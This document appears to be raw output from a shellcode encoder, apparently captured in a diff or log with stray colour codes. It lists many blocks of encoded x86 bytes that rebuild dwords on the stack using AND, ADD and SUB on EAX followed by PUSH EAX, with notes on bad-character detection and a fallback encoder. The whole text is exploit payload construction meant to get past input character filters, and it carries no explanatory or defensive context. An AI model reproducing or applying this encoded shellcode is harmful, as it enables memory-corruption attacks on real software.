+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x32\x33\x36[0m" ## add  eax, 0x36333221
+shellcode += "[37m\x05\x10\x32\x43\x36[0m" ## add  eax, 0x36433210
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [5059656e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x33\x35\x30[0m" ## add  eax, 0x30353337
+shellcode += "[37m\x05\x37\x32\x24\x20[0m" ## add  eax, 0x20243237
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [55586f79]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x44\x37\x34\x33[0m" ## add  eax, 0x33343744
+shellcode += "[37m\x05\x34\x36\x34\x33[0m" ## add  eax, 0x33343634
+shellcode += "[37m\x05\x34\x35\x23\x22[0m" ## add  eax, 0x22233534
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [31655442]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x32\x33\x21[0m" ## add  eax, 0x21333221
+shellcode += "[37m\x05\x21\x22\x32\x10[0m" ## add  eax, 0x10322221
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [754d594c]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x26\x35\x27\x33[0m" ## add  eax, 0x33273526
+shellcode += "[37m\x05\x26\x24\x26\x42[0m" ## add  eax, 0x42262426
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [48323776]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x23\x21\x24[0m" ## add  eax, 0x24212333
+shellcode += "[37m\x05\x43\x14\x11\x24[0m" ## add  eax, 0x24111443
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [56503072]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x20\x30\x33[0m" ## add  eax, 0x33302031
+shellcode += "[37m\x05\x41\x10\x20\x23[0m" ## add  eax, 0x23201041
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [7a61564b]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x26\x33\x31\x35[0m" ## add  eax, 0x35313326
+shellcode += "[37m\x05\x25\x23\x30\x45[0m" ## add  eax, 0x45302325
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [796f6c43]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x36\x37\x44[0m" ## add  eax, 0x44373632
+shellcode += "[37m\x05\x22\x35\x36\x34[0m" ## add  eax, 0x34363522
+shellcode += "[37m\x05\x22\x34\x35\x34[0m" ## add  eax, 0x34353422
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [71667037]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x30\x33\x31[0m" ## add  eax, 0x31333023
+shellcode += "[37m\x05\x14\x40\x33\x40[0m" ## add  eax, 0x40334014
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [52456850]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x34\x23\x31[0m" ## add  eax, 0x31233430
+shellcode += "[37m\x05\x20\x34\x22\x21[0m" ## add  eax, 0x21223420
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [7a577147]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x31\x33\x35[0m" ## add  eax, 0x35333123
+shellcode += "[37m\x05\x24\x40\x24\x45[0m" ## add  eax, 0x45244024
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [686c5049]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x30\x36\x34[0m" ## add  eax, 0x34363025
+shellcode += "[37m\x05\x24\x20\x36\x34[0m" ## add  eax, 0x34362024
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [48623563]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x23\x31\x24[0m" ## add  eax, 0x24312332
+shellcode += "[37m\x05\x31\x12\x31\x24[0m" ## add  eax, 0x24311231
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [7a31676f]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x34\x21\x45[0m" ## add  eax, 0x45213437
+shellcode += "[37m\x05\x36\x33\x22\x34[0m" ## add  eax, 0x34223336
+shellcode += "[37m\x05\x35\x33\x21\x34[0m" ## add  eax, 0x34213335
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [45796f49]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x37\x44\x33[0m" ## add  eax, 0x33443734
+shellcode += "[37m\x05\x24\x36\x34\x23[0m" ## add  eax, 0x23343624
+shellcode += "[37m\x05\x24\x35\x34\x22[0m" ## add  eax, 0x22343524
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [70394f49]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x37\x24\x41[0m" ## add  eax, 0x41243734
+shellcode += "[37m\x05\x24\x26\x24\x31[0m" ## add  eax, 0x31242624
+shellcode += "[37m\x05\x24\x25\x24\x31[0m" ## add  eax, 0x31242524
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4f544a6a]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x35\x33\x37[0m" ## add  eax, 0x37333535
+shellcode += "[37m\x05\x34\x24\x32\x26[0m" ## add  eax, 0x26322434
+shellcode += "[37m\x05\x34\x24\x22\x25[0m" ## add  eax, 0x25222434
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [78317032]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x30\x21\x34[0m" ## add  eax, 0x34213021
+shellcode += "[37m\x05\x11\x40\x10\x44[0m" ## add  eax, 0x44104011
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [50717052]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x30\x31\x30[0m" ## add  eax, 0x30313031
+shellcode += "[37m\x05\x21\x40\x40\x20[0m" ## add  eax, 0x20404021
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [30773056]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x20\x33\x20[0m" ## add  eax, 0x20332033
+shellcode += "[37m\x05\x23\x10\x44\x10[0m" ## add  eax, 0x10441023
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [70723036]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x20\x31\x30[0m" ## add  eax, 0x30312023
+shellcode += "[37m\x05\x13\x10\x41\x40[0m" ## add  eax, 0x40411013
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [5030755a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x33\x20\x30[0m" ## add  eax, 0x30203335
+shellcode += "[37m\x05\x25\x42\x10\x20[0m" ## add  eax, 0x20104225
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6f395045]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x31\x24\x37[0m" ## add  eax, 0x37243133
+shellcode += "[37m\x05\x23\x31\x24\x36[0m" ## add  eax, 0x36243123
+shellcode += "[37m\x05\x22\x21\x24\x35[0m" ## add  eax, 0x35242122
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4b62706f]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x41\x32\x36[0m" ## add  eax, 0x36324137
+shellcode += "[37m\x05\x36\x31\x31\x25[0m" ## add  eax, 0x25313136
+shellcode += "[37m\x05\x35\x31\x32\x23[0m" ## add  eax, 0x23323135
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [79456850]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x34\x23\x35[0m" ## add  eax, 0x35233430
+shellcode += "[37m\x05\x20\x34\x22\x44[0m" ## add  eax, 0x44223420
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [70525470]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x32\x31\x30[0m" ## add  eax, 0x30313230
+shellcode += "[37m\x05\x40\x22\x21\x40[0m" ## add  eax, 0x40212240
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [44484946]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x25\x24\x22[0m" ## add  eax, 0x22242523
+shellcode += "[37m\x05\x23\x24\x24\x22[0m" ## add  eax, 0x22242423
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [70473053]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x20\x23\x30[0m" ## add  eax, 0x30232032
+shellcode += "[37m\x05\x21\x10\x24\x40[0m" ## add  eax, 0x40241021
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6166306a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x20\x33\x31[0m" ## add  eax, 0x31332035
+shellcode += "[37m\x05\x35\x10\x33\x30[0m" ## add  eax, 0x30331035
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [38484569]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x23\x24\x24[0m" ## add  eax, 0x24242335
+shellcode += "[37m\x05\x34\x22\x24\x14[0m" ## add  eax, 0x14242234
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4f6b6736]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x34\x36\x37[0m" ## add  eax, 0x37363423
+shellcode += "[37m\x05\x23\x33\x35\x26[0m" ## add  eax, 0x26353323
+shellcode += "[37m\x05\x23\x33\x33\x25[0m" ## add  eax, 0x25333323
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [46664743]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x23\x33\x23[0m" ## add  eax, 0x23332322
+shellcode += "[37m\x05\x21\x24\x33\x23[0m" ## add  eax, 0x23332421
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c624832]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x24\x31\x36[0m" ## add  eax, 0x36312421
+shellcode += "[37m\x05\x11\x24\x31\x36[0m" ## add  eax, 0x36312411
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [74424f31]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x37\x32\x43[0m" ## add  eax, 0x43323721
+shellcode += "[37m\x05\x22\x26\x21\x32[0m" ## add  eax, 0x32212622
+shellcode += "[37m\x05\x21\x25\x22\x32[0m" ## add  eax, 0x32222521
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [62357330]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x20\x32\x23\x31[0m" ## add  eax, 0x31233220
+shellcode += "[37m\x05\x10\x41\x12\x31[0m" ## add  eax, 0x31124110
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [47637831]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x34\x32\x23[0m" ## add  eax, 0x23323421
+shellcode += "[37m\x05\x10\x44\x31\x24[0m" ## add  eax, 0x24314410
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [70477077]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x30\x23\x30[0m" ## add  eax, 0x30233033
+shellcode += "[37m\x05\x44\x40\x24\x40[0m" ## add  eax, 0x40244044
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [32705336]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x32\x30\x21[0m" ## add  eax, 0x21303223
+shellcode += "[37m\x05\x13\x21\x40\x11[0m" ## add  eax, 0x11402113
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [68306d63]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x37\x20\x34[0m" ## add  eax, 0x34203732
+shellcode += "[37m\x05\x31\x36\x10\x34[0m" ## add  eax, 0x34103631
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4d4c4b5a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x26\x26\x27[0m" ## add  eax, 0x27262635
+shellcode += "[37m\x05\x25\x25\x26\x26[0m" ## add  eax, 0x26262525
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [42654b6c]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x36\x26\x33\x21[0m" ## add  eax, 0x21332636
+shellcode += "[37m\x05\x36\x25\x32\x21[0m" ## add  eax, 0x21322536
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [7a624f61]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x37\x32\x45[0m" ## add  eax, 0x45323731
+shellcode += "[37m\x05\x32\x26\x31\x34[0m" ## add  eax, 0x34312632
+shellcode += "[37m\x05\x31\x25\x32\x34[0m" ## add  eax, 0x34322531
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4f517059]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x41\x31\x37[0m" ## add  eax, 0x37314134
+shellcode += "[37m\x05\x34\x31\x32\x26[0m" ## add  eax, 0x26323134
+shellcode += "[37m\x05\x24\x31\x21\x25[0m" ## add  eax, 0x25213124
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4f4b7132]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x41\x36\x37[0m" ## add  eax, 0x37364122
+shellcode += "[37m\x05\x21\x32\x25\x26[0m" ## add  eax, 0x26253221
+shellcode += "[37m\x05\x22\x31\x23\x25[0m" ## add  eax, 0x25233122
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [7a327942]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x35\x21\x35[0m" ## add  eax, 0x35213521
+shellcode += "[37m\x05\x21\x44\x11\x45[0m" ## add  eax, 0x45114421
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [51636b43]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x36\x32\x31[0m" ## add  eax, 0x31323622
+shellcode += "[37m\x05\x21\x35\x31\x20[0m" ## add  eax, 0x20313521
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6b736474]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x32\x32\x36[0m" ## add  eax, 0x36323232
+shellcode += "[37m\x05\x42\x32\x41\x35[0m" ## add  eax, 0x35413242
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [44565431]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x32\x33\x22[0m" ## add  eax, 0x22333221
+shellcode += "[37m\x05\x10\x22\x23\x22[0m" ## add  eax, 0x22232210
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [796f707a]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x45\x41\x37\x44[0m" ## add  eax, 0x44374145
+shellcode += "[37m\x05\x34\x31\x36\x34[0m" ## add  eax, 0x34363134
+shellcode += "[37m\x05\x34\x31\x35\x34[0m" ## add  eax, 0x34353134
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [51354b4c]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x26\x26\x23\x31[0m" ## add  eax, 0x31232626
+shellcode += "[37m\x05\x26\x25\x12\x20[0m" ## add  eax, 0x20122526
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [64366b6e]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x36\x23\x32[0m" ## add  eax, 0x32233637
+shellcode += "[37m\x05\x37\x35\x13\x32[0m" ## add  eax, 0x32133537
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [43396156]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x31\x25\x22[0m" ## add  eax, 0x22253133
+shellcode += "[37m\x05\x23\x30\x14\x21[0m" ## add  eax, 0x21143023
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c675870]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x34\x33\x36[0m" ## add  eax, 0x36333430
+shellcode += "[37m\x05\x40\x24\x34\x36[0m" ## add  eax, 0x36342440
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4b4c6b52]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x36\x26\x26[0m" ## add  eax, 0x26263631
+shellcode += "[37m\x05\x21\x35\x26\x25[0m" ## add  eax, 0x25263521
+shellcode += "[37m\x50[0m"                 ## push eax
